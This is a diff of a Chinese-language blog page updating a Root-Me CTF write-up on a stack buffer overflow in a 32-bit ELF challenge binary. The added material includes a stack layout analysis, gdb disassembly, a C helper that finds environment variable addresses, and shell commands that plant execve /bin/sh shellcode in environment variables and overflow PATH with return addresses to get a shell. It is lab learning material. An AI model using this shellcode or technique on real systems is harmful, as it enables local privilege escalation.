@@ -34,7 +34,7 @@
 <meta property="og:description" content="ELF x86 - stack buffer overflow basic 4参考:   https:&#x2F;&#x2F;github.com&#x2F;s1syphu5&#x2F;RootMe-Challenges&#x2F;tree&#x2F;master&#x2F;System&#x2F;ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204 https:&#x2F;&#x2F;gitlab.com&#x2F;rsheasby&#x2F;root-me-">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-12-29T13:26:05.000Z">
-<meta property="article:modified_time" content="2020-12-29T13:27:04.972Z">
+<meta property="article:modified_time" content="2020-12-29T13:54:15.356Z">
 <meta property="article:author" content="finsenty54">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -229,7 +229,7 @@
 
       <!--noindex-->
       <section class="post-toc-wrap sidebar-panel">
-          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ELF-x86-stack-buffer-overflow-basic-4"><span class="nav-number">1.</span> <span class="nav-text">ELF x86 - stack buffer overflow basic 4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91"><span class="nav-number">1.1.</span> <span class="nav-text">逆向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%A6%E5%88%B0%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">学到的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.1.</span> <span class="nav-text">设置环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%95%BF%E5%BA%A6"><span class="nav-number">1.2.2.</span> <span class="nav-text">查看环境变量长度</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ELF-x86-stack-buffer-overflow-basic-4"><span class="nav-number">1.</span> <span class="nav-text">ELF x86 - stack buffer overflow basic 4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91"><span class="nav-number">1.1.</span> <span class="nav-text">逆向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%96%E8%80%85%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D512%E5%AD%97%E8%8A%82%E5%8F%AF%E5%86%99%E7%A9%BA%E9%97%B4"><span class="nav-number">1.2.</span> <span class="nav-text">或者重新分配512字节可写空间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%A6%E5%88%B0%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-number">1.3.</span> <span class="nav-text">学到的命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.3.1.</span> <span class="nav-text">设置环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%95%BF%E5%BA%A6"><span class="nav-number">1.3.2.</span> <span class="nav-text">查看环境变量长度</span></a></li></ol></li></ol></li></ol></div>
       </section>
       <!--/noindex-->
 
@@ -336,7 +336,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2020-12-29 21:26:05 / 修改时间：21:27:04" itemprop="dateCreated datePublished" datetime="2020-12-29T21:26:05+08:00">2020-12-29</time>
+      <time title="创建时间：2020-12-29 21:26:05 / 修改时间：21:54:15" itemprop="dateCreated datePublished" datetime="2020-12-29T21:26:05+08:00">2020-12-29</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -377,14 +377,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>3.3k</span>
+      <span>6.1k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
+      <span>6 分钟</span>
     </span>
 </div>
 
@@ -400,6 +400,7 @@
 <li><a target="_blank" rel="noopener" href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a></li>
 <li><a target="_blank" rel="noopener" href="https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md">https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md</a></li>
 <li><a target="_blank" rel="noopener" href="http://showlinkroom.me/2017/12/04/Root-me-App-System02/">http://showlinkroom.me/2017/12/04/Root-me-App-System02/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution">https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution</a></li>
 </ol>
 <h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><code>struct EnvInfo GetEnv(void)&#123;&#125;</code> 中有<code>strcpy()</code>函数，存在溢出点。</p>
 <pre><code>            +----------------------------+
@@ -418,6 +419,16 @@
             |   rep movsl dest. address  |     %ebp + 8
             +----------------------------+  </code></pre>
 <a id="more"></a>
+<p>Since 540 - 128 = 412, 412 - 128 = 284 and 284 - 128 = 156, we get the following stack summary:</p>
+<ul>
+<li>%ebp - 540​ | env.home​​ ​​</li>
+<li>%ebp - 412 | env.username</li>
+<li>%ebp - 284 | env.shell</li>
+<li>%ebp - 156 | env.path</li>
+<li>%ebp | saved frame pointer</li>
+<li>%ebp + 4 | saved EIP</li>
+<li>%ebp + 8 | rep movsl destination address</li>
+</ul>
 <p>var char *dest @ ebp-0x21c</p>
 <p>0x08048590 e8dbfdffff     sym.imp.strcpy ();[og] 第二次的赋值，USERNAME</p>
 <pre><code>gdb-peda$ x/101xw 0xbffff3cc 存输入值
@@ -449,6 +460,21 @@
 0xbffff55c:     0x0804a000</code></pre>
 <p><code>EAX: 0xbffff44c (&#39;a&#39; &lt;repeats 200 times&gt;...)</code><br>存shell 字符串</p>
 <p><code>EAX: 0xbffff4cc (&#39;a&#39; &lt;repeats 128 times&gt;, &quot;e\377\377\277&quot;, &#39;a&#39; &lt;repeats 12 times&gt;)</code><br>放path</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disas GetEnv</span></span><br><span class="line">[...] # How much memory is allocated?</span><br><span class="line">0x080484aa &lt;+6&gt;:        sub    $0x22c,%esp      # (1)</span><br><span class="line">[...] # Let&#x27;s see what happens after the last &#x27;strcpy&#x27; call...</span><br><span class="line">   0x080485c0 &lt;+284&gt;:        call   0x8048390 &lt;strcpy@plt&gt; </span><br><span class="line">   0x080485c5 &lt;+289&gt;:        mov    0x8(%ebp),%eax # (2-dest)</span><br><span class="line">   0x080485c8 &lt;+292&gt;:        lea    -0x21c(%ebp),%edx # (3-source)</span><br><span class="line">   0x080485ce &lt;+298&gt;:        mov    $0x200,%ebx # (4-length) </span><br><span class="line">[...] # Some alignment details skipped...</span><br><span class="line">   0x08048602 &lt;+350&gt;:        mov    %ebx,%ecx # (4-length)</span><br><span class="line">   0x08048604 &lt;+352&gt;:        shr    $0x2,%ecx # (4-length)</span><br><span class="line">   0x08048607 &lt;+355&gt;:        mov    %eax,%edi # (2-dest)</span><br><span class="line">   0x08048609 &lt;+357&gt;:        mov    %edx,%esi # (3-source)</span><br><span class="line">   0x0804860b &lt;+359&gt;:        rep movsl %ds:(%esi),%es:(%edi)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p> program allocates 0x22c = 556 bytes (an EnvInfo struct is around 512 bytes long),</p>
+</li>
+<li><p> rep movsl … instruction at the end of the function, which consists of copying <strong>n long words **from %esi to %edi, with n being the value stored in **%ecx</strong> ;</p>
+</li>
+<li><p>it loads an address located at %ebp + 8 into the %edi register (destination address)</p>
+</li>
+<li><p>it loads the address of %ebp - 540 (0x21c = 540) into the %esi register (source address)</p>
+</li>
+<li><p>%ecx is initially set <strong>to 0x200(512) **and then **divided by 4 (shr $2)</strong>, i.e., %ecx <strong>equals 128</strong>. Hence, 128 long (4-bytes) words will be copied, resulting in the 512 bytes of the 4 buffers of an EnvInfo struct.</p>
+<p>in order to output its EnvInfo struct, GetEnv <strong>creates a local struct</strong> where it stores the data first, and then, in its prologue**, GetEnv actually replicates the local struct into a “remote” struct, l<strong>ocated at the address read **at %ebp + 8</strong><br>还要复制结构体</p>
+</li>
+</ul>
+<p><code> $PATH=$(python -c &#39;print &quot;/usr/local/bin:&quot; + &quot;A&quot; * (164-16)&#39;) peda -ex &quot;run&quot; ./ch8</code><br>这命令</p>
 <p>如果打印420（412+4 =416 在这里输入4个字节，总长变为420） a，溢出</p>
 <pre><code>gdb-peda$ x/16xb 0xbffff55c
 0xbffff55c:     0x61    0x61    0x61    0x61    0x00    0xf5    0xff    0xbf</code></pre>
@@ -456,6 +482,15 @@
 <p>打印416 a</p>
 <pre><code>0xbffff55c:     0x08048600      0xbffff570</code></pre>
 <p>没有改变ebp+8<br>这个地址是main中env结构体地址</p>
+<h2 id="或者重新分配512字节可写空间"><a href="#或者重新分配512字节可写空间" class="headerlink" title="或者重新分配512字节可写空间"></a>或者重新分配512字节可写空间</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * ptr;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">        ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code> cd /tmp; gcc -m32 -o find_env find_env.c; cd -</code></p>
+<pre><code>app-systeme-ch8@challenge02:~$ export SHELLCODE=`python -c &quot;print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;`
+app-systeme-ch8@challenge02:~$ export JUNK=`python -c &quot;print &#39;B&#39; * 1000&quot;`
+app-systeme-ch8@challenge02:~$ /tmp/find_env SHELLCODE ./ch8
+SHELLCODE will be at 0xbffff931
+app-systeme-ch8@challenge02:~$ /tmp/find_env JUNK ./ch8
+JUNK will be at 0xbffffb2b</code></pre>
+<p><code>export PATH=</code>python -c “print ‘A’*160 + ‘\x31\xf9\xff\xbf’ + ‘\x2b\xfb\xff\xbf’”``</p>
 <hr>
 <p>我们将shellcode放在USERNAME上，我试了几个shellcode，只有这个有用，</p>
 <pre><code>export USERNAME=`python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;`</code></pre>
@@ -472,6 +507,7 @@ bash-4.4$ cat .passwd</code></pre>
 <h3 id="查看环境变量长度"><a href="#查看环境变量长度" class="headerlink" title="查看环境变量长度"></a>查看环境变量长度</h3><p><code>echo $&#123;#PATH&#125;</code></p>
 <hr>
 <p><code>gdb-peda$ print $ebp-0xbffff55c</code></p>
+<p><code>disas GetEnv</code></p>
 
     </div>
 
@@ -588,14 +624,14 @@ bash-4.4$ cat .passwd</code></pre>
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">191k</span>
+    <span title="站点总字数">193k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:53</span>
+    <span title="站点阅读时长">2:56</span>
   </span>
 </div>
 <div class="busuanzi-count">
